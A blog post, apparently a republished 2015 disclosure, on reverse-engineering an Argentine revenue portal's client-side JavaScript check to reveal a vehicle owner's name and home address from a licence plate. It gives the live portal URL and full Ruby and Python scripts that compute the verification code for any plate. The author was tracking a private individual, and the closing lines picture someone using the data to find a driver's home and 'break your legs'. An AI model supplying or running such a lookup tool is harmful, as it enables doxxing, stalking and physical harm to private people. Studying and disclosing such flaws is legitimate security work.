---
title: "License Plate OSINT: Argentina Vehicle Registry"
publishDate: "2015-02-19"
description: "How I reverse-engineered Argentina's license plate system to track down a hit-and-run driver using client-side JavaScript vulnerabilities."
tags: ["osint", "javascript", "reverse-engineering", "argentina", "vehicle-registry", "client-side-security"]
draft: false
---

![Static CAPTCHA Testing](/assets/blog/license-plate/test.png)
*Testing multiple verification codes with JMO089 - notice the CAPTCHA never changes*

Some time ago I had the misfortune of being involved in a serious traffic accident. Since I was traveling by motorcycle, I took the worst part of it. Completely contrary to what I expected, the person responsible for the accident did not stop to assist me - instead, they chose to flee the scene.

After all the medical protocols, a few bruises, and finding no answers from the police due to lack of witnesses, I decided to start a personal search to identify the vehicle with the only piece of data I had managed to glimpse during the impact:

**The license plate number**

For confidentiality reasons, I won't use the real license plate of the aggressor, but rather one I managed to read at the motor vehicle registry while processing insurance paperwork.

## The Question

Is there any system that allows me to query the data and status of a vehicle currently traveling on the street? The answer is yes!

After some Google searches, I found a Revenue service in the province of Buenos Aires that allows us to query the debt status of license plates:

**https://lbserver02.agip.gob.ar/ConsultaPat/index.html**

The system works in two ways: if you're not the owner, you can only obtain data corresponding to debts on the vehicle, but the system doesn't allow you to access the sections that identify the person registered in the Motor Vehicle Registry as the vehicle owner.

On the other hand, to verify vehicle ownership, the system requests entering a special **unique** verification number that only the car owner should possess, since it's used to print payment receipts for debts that include the vehicle owner's personal data, thus guaranteeing user data privacy.

The first thing we can analyze on the site is that the special verification digit of the system only accepts values ranging from 00 to 99 (the value isn't as unique as one might think).

![JavaScript Validation Function](/assets/blog/license-plate/num.png)

The license plate to study in this post will be **JMO089**. After performing some manual tests, we can see that the system's captcha is never updated once we're associated with a session, allowing us to manually try the 99 possible combinations until finding the correct one.

![JavaScript Files Analysis](/assets/blog/license-plate/sin-nombre.png)

In the image, we can see that the captcha doesn't change as we try possible numeric combinations until we find the correct one, which gives the possibility of programming a brute forcer that tries all possible values until finding the right one. But such an attack presents a problem when facing a captcha, which I wasn't willing to deal with due to lack of time to program an **OCR**.

The question I formulated was:

**What is the way the system validates the correct value of the verification digit?**

The first thing I thought was that the system validated the value server-side after the query, so I started checking the requests the site made when submitting the form. For this, I used **Live HTTP Headers**.

![HTTP Headers Analysis](/assets/blog/license-plate/ajax.png)

When I encountered this, I couldn't believe what I was seeing. Technically speaking, if a validation doesn't present a web request to the Backend, it means the validation is being performed client-side, meaning:

## THE SYSTEM VALIDATES BY JAVASCRIPT!

This implies that the verification code validation algorithm is served in some **javascript** file on the browser side, so I started analyzing the HTML source document to identify some indication of the validation. The first files I analyzed were the following:

![Validation Algorithm Source Code](/assets/blog/license-plate/ttt.png)

Within the **consultaDatos.js** file, I found the following function with a revealing name: **validaDatos**

![Validation Algorithm Source Code](/assets/blog/license-plate/validator.png)

```javascript
if (!check.checked && patente.valido(dom1) != true)
```

In the same function, you can see in the highlighted lines the structure where the valid license plate message is decided, fulfilling the requirements that the **checkbox** is checked and the result of the **patente.valido()** function is necessary to correctly resolve the **if()** decision structure.

The problem was that the **patente.valido()** function wasn't within the same document, so I had to find the file where it was located.

For those unfamiliar with JavaScript functionality, I clarify that js files represent a large structured code divided into different files to improve organization, but whenever these files are included in the HTML, they can make calls to functions defined among them as if they were all members of the same class.

After searching a bit, I reached the following file: 

![Validation Algorithm Source Code](/assets/blog/license-plate/pat2.png)

Where we can obtain the structure of the validator code:

![Validation Algorithm Source Code](/assets/blog/license-plate/getdv.png)

**Complete Function**: http://pastebin.com/gYTdC9Yh

After carefully analyzing the code, I was able to uncover its final behavior.

The code calculates the verification digit based on the vehicle's license plate, substituting letters with special numbers to form a decimal string, which then adds according to its index - even positions on one side and odd positions on the other, as if dealing with an array.

![Validation Algorithm Source Code](/assets/blog/license-plate/tetete2.png)

Then, if these separated values (digi1 and digi2) have a length greater than one digit (0 to 9), it adds them respectively again until obtaining 2 independent numbers with a length of one digit (0 to 9).

And then concatenates them to obtain the magic verification number:

![Verification Calculation](/assets/blog/license-plate/salida.png)

What's somewhat comical is that this function has no protection and can be called from Google Chrome or Firefox's development console:

![Console Testing](/assets/blog/license-plate/call.png)

With this verification number, we can successfully perform the query:

![Successful Query](/assets/blog/license-plate/principal.png)

When requesting an invoice, we can see the personal data including the registered owner's name and residential address:

![Personal Data Exposed](/assets/blog/license-plate/datos.png)

![License Plate Result](/assets/blog/license-plate/jmo.png)

After some reverse engineering, I developed the following scripts that allow calculating any verification digit with just the license plate number:

## Ruby Script

```ruby
require 'colorize' # By hdbreaker

class Calculate 
  def initialize()
    # Initialize class associative array
    @letrasValidas = {
      'A' => '14', 'B' => '01', 'C' => '00', 'D' => '16', 'E' => '05', 'F' => '20', 'G' => '19',
      'H' => '09', 'I' => '24', 'J' => '07', 'K' => '21', 'L' => '08', 'M' => '04', 'N' => '13',
      'O' => '25', 'P' => '22', 'Q' => '18', 'R' => '10', 'S' => '02', 'T' => '06', 'U' => '12',
      'V' => '23', 'W' => '11', 'X' => '03', 'Y' => '15', 'Z' => '17', ' ' => '60'
    }
  end

  # Function to calculate license plate number
  def calculate(patente)
    patAux = patente.upcase
    pares = 0
    impares = 0

    # Block to substitute letters with corresponding numbers
    @letrasValidas.each { |key|
      if(patAux.include? key[0])
        patAux = patAux.gsub(key[0], key[1])
      end
    }

    # Sum odds on one side and evens on the other
    for x in (0...patAux.length)
      if (x % 2 == 0)
        pares += patAux[x].to_i
      else
        impares += patAux[x].to_i
      end
    end

    # If the sum of evens gives a number greater than 1 digit, sum them again until obtaining 1 digit
    digi1 = pares.to_s
    while (digi1.length > 1)
      pares = 0
      for x in (0...digi1.length)
        pares += digi1[x].to_i
      end
      digi1 = pares.to_s
    end

    # If the sum of odds gives a number greater than 1 digit, sum them again until obtaining 1 digit
    digi2 = impares.to_s
    while (digi2.length > 1)
      impares = 0
      for x in (0...digi2.length)
        impares += digi2[x].to_i
      end
      digi2 = impares.to_s
    end

    # Screen output
    puts "\n############## Buenos Aires Revenue ##############".green
    puts "URL: ".green+"https://lbserver02.agip.gob.ar/ConsultaPat/index.html".red
    puts "License Plate: ".green+patente.red
    puts "Verification Code: ".green+digi1.red+""+digi2.red
    puts "\n"
  end
end

if(ARGV.length==1)
  obj = Calculate.new()
  obj.calculate(ARGV[0].to_s)
else
  puts "Usage: ruby calculate.rb [license_plate]"
end
```

I also provide the Python script created by **[Q]3rV[0]**:

## Python Script

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Author : [Q]3rV[0]

import re

def main():
    pares = 0
    impares = 0
    letrasPatente = {
        "A":"14", "B":"01", "C":"00", "D":"16", "E":"05", "F":"20", "G":"19", "H":"09", 
        "I":"24", "J":"07", "K":"21", "L":"08", "M":"04", "N":"13", "O":"25", "P":"22", 
        "Q":"18", "R":"10", "S":"02", "T":"06", "U":"12", "V":"23", "W":"11", "X":"03", 
        "Y":"15", "Z":"17", " ":"60"
    }
    
    input_plate = raw_input("License Plate Number: ")
    patente = input_plate.upper()
    
    if re.match("[A-Z][A-Z][A-Z][0-9][0-9][0-9]$", patente) != None:
        toInt = ""
        for n in patente[0:3]:
            toInt += letrasPatente[n]
        nums = toInt + patente[3:] 
        
        for n in range(len(nums)):
            if n % 2 == 0:
                pares += int(nums[n])
            else:
                impares += int(nums[n])

        while len(str(pares)) != 1:
           dp = 0
           for p in str(pares):
               dp += int(p)
           pares = dp
          
        while len(str(impares)) != 1:
           di = 0
           for i in str(impares):
               di += int(i)
           impares = di
        
        print "| License Plate: %s | Verification Code: %s%s |" % (patente, pares, impares)
    else:
        print "[*] Error, Make sure the license plate format is correct. Example: GTD125"
       
if __name__ == '__main__':
    main()
```

## Conclusion

I hope this research serves to raise awareness about the security of our personal data, since we must remember that the flaw is in a government network that recklessly exposes people's personal information.

And if you're a driver... don't go around the streets thinking you're untouchable. You never know who you might encounter or what they might use your data for. You might find yourself facing someone who, instead of reporting the flaw, uses your information to find you, go to your house, and break your legs.

**Greetings!**

---

**Research conducted by**: Alejandro Parodi (hdbreaker)  
**Original post**: [Security Signal Blog](https://securitysignal.blogspot.com/2015/02/quien-te-choco-hackeado-patentes.html)  
**Impact**: Demonstrates serious privacy vulnerabilities in government systems 
